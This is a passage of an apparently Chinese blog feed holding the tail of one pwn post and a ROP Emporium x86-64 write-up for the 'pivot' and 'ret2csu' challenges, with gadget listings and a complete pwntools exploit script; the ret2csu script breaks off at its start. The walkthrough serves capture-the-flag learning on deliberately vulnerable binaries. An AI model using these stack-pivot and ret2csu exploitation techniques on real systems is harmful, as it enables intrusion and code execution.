class="keyword">call</span> void <span class="title">@other157</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other158</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other159</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other160</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other161</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other162</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other163</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other164</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other165</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other166</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other167</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other168</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other169</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other170</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other171</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other172</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other173</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other174</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other175</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other176</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other177</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other178</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other179</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other180</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other181</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other182</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other183</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other184</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other185</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other186</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other187</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other188</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other189</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other190</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other191</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other192</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other193</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other194</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other195</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other196</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other197</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other198</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other199</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other200</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other201</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other202</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other203</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other204</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other205</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other206</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other207</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other208</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other209</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other210</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other211</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other212</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other213</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other214</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other215</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other216</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other217</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other218</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other219</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other220</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other221</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other222</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other223</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other224</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other225</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other226</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other227</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other228</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other229</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other230</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other231</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other232</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other233</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other234</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other235</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other236</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other237</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other238</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other239</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other240</span>(<span class="type">i32</span> <span class="number">0</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other241</span>(<span class="type">i32</span> <span class="number">0</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other242</span>(<span class="type">i32</span> <span class="number">64</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other243</span>(<span class="type">i32</span> <span class="number">0</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other244</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other245</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other246</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other247</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other248</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other249</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other250</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other251</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other252</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other253</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other254</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other255</span>(<span class="type">i32</span> <span class="number">233</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other243</span>(<span class="type">i32</span> <span class="number">0</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other242</span>(<span class="type">i32</span> <span class="number">0</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other241</span>(<span class="type">i32</span> <span class="number">0</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@other240</span>(<span class="type">i32</span> <span class="number">0</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@upgrade</span>(<span class="type">i32</span> <span class="number">255</span>)</span><br><span class="line">  <span class="keyword">call</span> void <span class="title">@fight</span>(<span class="type">i32</span> <span class="number">0</span>)</span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">attributes</span> <span class="variable">#0</span> <span class="operator">=</span> &#123; <span class="keyword">noinline</span> <span class="keyword">nounwind</span> <span class="keyword">optnone</span> <span class="keyword">uwtable</span> <span class="string">&quot;correctly-rounded-divide-sqrt-fp-math&quot;</span><span class="operator">=</span><span class="string">&quot;false&quot;</span> <span class="string">&quot;disable-tail-calls&quot;</span><span class="operator">=</span><span class="string">&quot;false&quot;</span> <span class="string">&quot;less-precise-fpmad&quot;</span><span class="operator">=</span><span class="string">&quot;false&quot;</span> <span class="string">&quot;min-legal-vector-width&quot;</span><span class="operator">=</span><span class="string">&quot;0&quot;</span> <span class="string">&quot;no-frame-pointer-elim&quot;</span><span class="operator">=</span><span class="string">&quot;true&quot;</span> <span class="string">&quot;no-frame-pointer-elim-non-leaf&quot;</span> <span class="string">&quot;no-infs-fp-math&quot;</span><span class="operator">=</span><span class="string">&quot;false&quot;</span> <span class="string">&quot;no-jump-tables&quot;</span><span class="operator">=</span><span class="string">&quot;false&quot;</span> <span class="string">&quot;no-nans-fp-math&quot;</span><span class="operator">=</span><span class="string">&quot;false&quot;</span> <span class="string">&quot;no-signed-zeros-fp-math&quot;</span><span class="operator">=</span><span class="string">&quot;false&quot;</span> <span class="string">&quot;no-trapping-math&quot;</span><span class="operator">=</span><span class="string">&quot;false&quot;</span> <span class="string">&quot;stack-protector-buffer-size&quot;</span><span class="operator">=</span><span class="string">&quot;8&quot;</span> <span class="string">&quot;target-cpu&quot;</span><span class="operator">=</span><span class="string">&quot;x86-64&quot;</span> <span class="string">&quot;target-features&quot;</span><span class="operator">=</span><span class="string">&quot;+fxsr,+mmx,+sse,+sse2,+x87&quot;</span> <span class="string">&quot;unsafe-fp-math&quot;</span><span class="operator">=</span><span class="string">&quot;false&quot;</span> <span class="string">&quot;use-soft-float&quot;</span><span class="operator">=</span><span class="string">&quot;false&quot;</span> &#125;</span><br><span class="line"></span><br><span class="line"><span class="title">!llvm.module.flags</span> <span class="operator">=</span> !&#123;<span class="title">!0</span>&#125;</span><br><span class="line"><span class="title">!llvm.ident</span> <span class="operator">=</span> !&#123;<span class="title">!1</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="title">!0</span> <span class="operator">=</span> !&#123;<span class="type">i32</span> <span class="number">1</span><span class="punctuation">,</span> !<span class="string">&quot;wchar_size&quot;</span><span class="punctuation">,</span> <span class="type">i32</span> <span class="number">4</span>&#125;</span><br><span class="line"><span class="title">!1</span> <span class="operator">=</span> !&#123;!<span class="string">&quot;clang version 8.0.1-9 (tags/RELEASE_801/final)&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/a67919daf1d345f98c122c9af2d30788.png"><br>成功getshell。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/02/28/ROP-Emporium-x86-64-7~8%E9%A2%98/"/>
      <url>/2023/02/28/ROP-Emporium-x86-64-7~8%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>ROP Emporium是一个提供ROP攻击学习样板程序的网站，一共8道题，每道题有64位、32位、ARM、MIPS共4种格式的ELF文件，适用于多种平台，难度依次递增。本文档为前6道题的x86_64位版本的解析。</p><p><a href="https://ropemporium.com/index.html">ROP Emporium</a></p><h1 id="7-pivot"><a href="#7-pivot" class="headerlink" title="7. pivot"></a>7. pivot</h1><p>看名字就知道，这是一道栈迁移的题目。</p><p>gadget如下，有对栈的操作，能够修改rsp，也就能进行栈迁移了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004009BB ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00000000004009BB</span><br><span class="line">.text:00000000004009BB usefulGadgets:</span><br><span class="line">.text:00000000004009BB                 pop     rax</span><br><span class="line">.text:00000000004009BC                 retn</span><br><span class="line">.text:00000000004009BD ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00000000004009BD                 xchg    rax, rsp</span><br><span class="line">.text:00000000004009BF                 retn</span><br><span class="line">.text:00000000004009C0 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00000000004009C0                 mov     rax, [rax]</span><br><span class="line">.text:00000000004009C3                 retn</span><br><span class="line">.text:00000000004009C4 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00000000004009C4                 add     rax, rbp</span><br><span class="line">.text:00000000004009C7                 retn</span><br><span class="line">.text:00000000004009C7 ; ---------------------------------------------------------------------------</span><br></pre></td></tr></table></figure><p>程序一共有两次输入的机会，第一次是在伪造的栈中，第二次是直接接在后面的ROP。第二次的ROP长度不足，因此采用栈迁移。经过试验发现，第二个ROP的长度正好足够进行栈迁移。迁移后，我们只需要返回到ret2win函数即可。但是这个函数在lib文件中，加载基地址未知。对此，我们可以调用gadget获取lib中foothold_function函数的基地址，这也是源程序中唯一一个能够在plt节中找到的lib函数。注意到有一个gadget是mov rax, [rax]，既然我们能够控制rax的值，就可以将任意地址的值写入到rax中。如果没有这个gadget，我们就需要使用puts或printf函数将地址输出并返回到main函数中再次进行ROP注入。注意到还有一个gadget是add rax, rbp。我们读取lib中的函数偏移，让rbp等于ret2win的地址与foothold_function地址之差，就能够不通过输出直接将ret2win的地址保存到rax之中（在整个过程中rbp会通过leave, push, pop等指令保持不变）。注意到程序中有一条指令为jmp rax。我们直接跳转到这条指令即可让控制流跳转到ret2win函数。我想作者不让我们使用puts函数再进行一次注入的原因可能与程序本身有关，因为除了jmp rax之外，我们无法将返回地址写到栈上，这也就强迫我们使用所有的gadget。</p><p>参考：leave指令 &#x3D; mov rsp, rbp;  mov rbp, [rbp]</p><p>payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./pivot&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pivot&#x27;</span>)</span><br><span class="line">lib = ELF(<span class="string">&#x27;./libpivot.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rax = <span class="number">0x4009bb</span></span><br><span class="line">rsp = <span class="number">0x4009bd</span></span><br><span class="line">rax_addr = <span class="number">0x4009c0</span></span><br><span class="line">add_rax = <span class="number">0x4009c4</span></span><br><span class="line">jmp_rax = <span class="number">0x4007c1</span></span><br><span class="line">main_addr = <span class="number">0x400847</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;place to pivot: 0x&#x27;</span>)</span><br><span class="line">fake_stack = <span class="built_in">int</span>(io.recv(<span class="number">12</span>).decode(), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ROP chain in fake stack</span></span><br><span class="line">payload = p64(elf.plt[<span class="string">&#x27;foothold_function&#x27;</span>])<span class="comment"># call foothold_function() first so that the .got section can be rewritten into real address of this function</span></span><br><span class="line">payload += p64(rax) + p64(elf.got[<span class="string">&#x27;foothold_function&#x27;</span>])<span class="comment"># get rax to the address of .got</span></span><br><span class="line">payload += p64(rax_addr)<span class="comment"># read the address to rax</span></span><br><span class="line">payload += p64(add_rax)</span><br><span class="line">payload += p64(jmp_rax)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ROP chain in stack</span></span><br><span class="line">payload = cyclic(<span class="number">32</span>)<span class="comment"># 0x20</span></span><br><span class="line">payload += p64(lib.symbols[<span class="string">&#x27;ret2win&#x27;</span>] - lib.symbols[<span class="string">&#x27;foothold_function&#x27;</span>])<span class="comment"># value that needed to be added to rax later</span></span><br><span class="line">payload += p64(rax) + p64(fake_stack)<span class="comment"># pop fake stack address to rax</span></span><br><span class="line">payload += p64(rsp)<span class="comment"># exchange rax and rsp, the length of first ROP comes to the limit: 0x40</span></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="8-ret2csu"><a href="#8-ret2csu" class="headerlink" title="8. ret2csu"></a>8. ret2csu</h1><p>这是一种利用__libc_csu_init函数构造ROP的攻击方式。在本题中，由于是64位程序，因此在有些细节方面可能不好把握。</p><p><img src="https://img-blog.csdnimg.cn/7e3d8999ad3b4824a9e8a6937c3118f8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>本题有后门函数ret2win，但是要想拿到shell首先需要传入正确的参数，即第7行的3个参数。</p><p>ret2csu的攻击流程大致如下：</p><p>首先将返回地址改到ret2csu函数的这个地方：<br><img src="https://img-blog.csdnimg.cn/f0cc71685ea44b81842923a51a9622a6.png"><br>在这里我们可以控制一系列寄存器的值。如果我们使用ROPgadget查找还能够发现惊喜。<br><img src="https://img-blog.csdnimg.cn/3f6b36c38de5463c8575e86e8009d44f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16"><br>注意到上面的pop rdi; ret了吗？它实际上是将原来的pop r15指令拆掉了，其机器码正好是5F，上面的pop rsi, ret同理。因此在这里我们可以控制的寄存器有：rbx,rbp,r12,r13,r14,r15,rdi,rsi，其中rdi,rsi是作为函数的前两个参数传递的，因此我们可以正确地传入前两个参数。</p><p>第三个函数参数在rdx中保存，可惜我们这里并不能控制rdx，这就需要用到__libc_csu_init函数的第二个gadget了：<br><img src="https://img-blog.csdnimg.cn/0fa8d75ba48a4c8a92aadcdbdadf46f4.png"><br>这里可以将rdx赋值为r15的值，而我们之前能够控制r15的值，因此第三个参数能够正确传入。后面的call指令，由于我们能够控制r12和rbx的值，那么也就相当于我们可以call任意一个地址。</p><p>但是！有一个问题出现了。请注意，这里会对rdx,rsi,edi进行赋值。其中rdx和rsi的赋值都没问题，我们将参数事先存放到r15和r14中即可。问题就出在对edi的赋值上。根据测试检验发现，mov esi, r13d指令会将rdi的高32位清零。这就会导致我们的第一个参数错误。但好巧不巧的是其后面就是call指令，我们已经没有机会再去修改这个错误了。</p><p>我曾经想过，如果第一次能够call回到第一个ROP段中将rdi重新pop一次，之后直接返回到call指令，或许有用。但这里的call是取地址，如果将r12+rbx*8改为pop rdi;ret的地址，实际上call的并不是这里，而是会读取这里的机器码call出去，这当然是会崩溃的。</p><p>参考其他资料发现这里的指令依libc版本不同而可能不同，在有些版本中是mov rdi, r13，这样的话没有任何问题，但现在这种情况就需要动动脑子了。问师傅，鸽了两周都不回——无奈只能全论坛找答案。（菜）</p><p>参考文章：<a href="https://blog.csdn.net/devil8123665/article/details/123810055?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165052857116780357264558%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=165052857116780357264558&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-3-123810055.142%5Ev9%5Econtrol,157%5Ev4%5Econtrol&utm_term=ROP_emporium+ret2csu&spm=1018.2226.3001.4187">传送门</a></p><p>实际上通过ret，我们不是非得通过call指令转到ret2win函数，任何一个ret之后接ret2win函数的地址均可。所以这里的思路就是：让call指令无意义且在确保对寄存器影响最小的情况下返回，不能影响rdx的值，否则无效。</p><p><img src="https://img-blog.csdnimg.cn/a851002722fb4b1c8ede1ba69c849e14.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16"><br>我们再回过头看一下这段代码，如果我们call之后能够安全返回，那么之后会判断rbp和rbx是否相等。我们可以控制rbp和rbx的值，因此这里的jnz我们可以跳过，方法是：将rbx赋值为0，rbp赋值为1。这样在call之后我们又可以进行一连串的pop操作。此时的pop显然并不会影响rdi,rsi,rdx的值，在ret之后接上pop rdi,ret的地址就能够将rdi成功修正，然后直接返回到ret2win函数，岂不妙哉。</p><p>因此，我们现在的目标是在ret2csu程序中找到一个能够安全返回且不影响rdx的代码片段。当然我们需要根据ret指令来查找。在IDA中进行查找，对每个ret指令前面的代码进行检查，判断其是否满足我们的需求。下面是找到的可能符合需求的几个代码碎片：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">.init:00000000004004E2 48 83 C4 08                                   add     rsp, 8</span><br><span class="line">.init:00000000004004E6 C3                                            retn</span><br><span class="line"></span><br><span class="line">.text:0000000000400588 5D                                            pop     rbp</span><br><span class="line">.text:0000000000400589 C3                                            retn</span><br><span class="line"></span><br><span class="line">.text:00000000004005C8 5D                                            pop     rbp</span><br><span class="line">.text:00000000004005C9 C3                                            retn</span><br><span class="line"></span><br><span class="line">.text:00000000004005E2 C6 05 4F 0A 20 00 01                          mov     cs:__bss_start, 1</span><br><span class="line">.text:00000000004005E9 5D                                            pop     rbp</span><br><span class="line">.text:00000000004005EA C3                                            retn</span><br><span class="line"></span><br><span class="line">.text:0000000000400610 B8 00 00 00 00                                mov     eax, 0</span><br><span class="line">.text:0000000000400615 5D                                            pop     rbp</span><br><span class="line">.text:0000000000400616 C3                                            retn</span><br><span class="line"></span><br><span class="line">.text:0000000000400630 5D                                            pop     rbp</span><br><span class="line">.text:0000000000400631 C3                                            retn</span><br><span class="line"></span><br><span class="line">.text:0000000000400696 48 83 C4 08                                   add     rsp, 8</span><br><span class="line">.text:000000000040069A 5B                                            pop     rbx</span><br><span class="line">.text:000000000040069B 5D                                            pop     rbp</span><br><span class="line">.text:000000000040069C 41 5C                                         pop     r12</span><br><span class="line">.text:000000000040069E 41 5D                                         pop     r13</span><br><span class="line">.text:00000000004006A0 41 5E                                         pop     r14</span><br><span class="line">.text:00000000004006A2 41 5F                                         pop     r15</span><br><span class="line">.text:00000000004006A4 C3                                            retn</span><br><span class="line"></span><br><span class="line">.fini:00000000004006B4 48 83 EC 08                                   sub     rsp, 8          ; _fini</span><br><span class="line">.fini:00000000004006B8 48 83 C4 08                                   add     rsp, 8</span><br><span class="line">.fini:00000000004006BC C3                                            retn</span><br></pre></td></tr></table></figure><p>其中最值得我们关注的就是最后一个片段，它将rsp减8又加8，相当于没有任何变化，而前面的片段均对寄存器有或多或少的影响。于是我们使用最后一个代码片段试试看。</p><p>要能够成功使用代码片段，还需要在内存空间中找到一个保存着这个代码段地址的地方，因为前面已经说过，call的地址是取值拿到的，所以不能直接将地址放在寄存器中。我们在IDA中尝试搜索，没想到还真的搜索到了：</p><p><img src="https://img-blog.csdnimg.cn/c787b0b10f4b433b9e2669e23370040d.png"></p><p>我们只需要将r12赋值为0x4003b0，就能够完美跳过这个call并毫发无损地返回，也就有了修正第一个参数的机会。注意：此时我们会多pop掉7个参数，因此要在栈中加7个无效数。</p><p>payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> 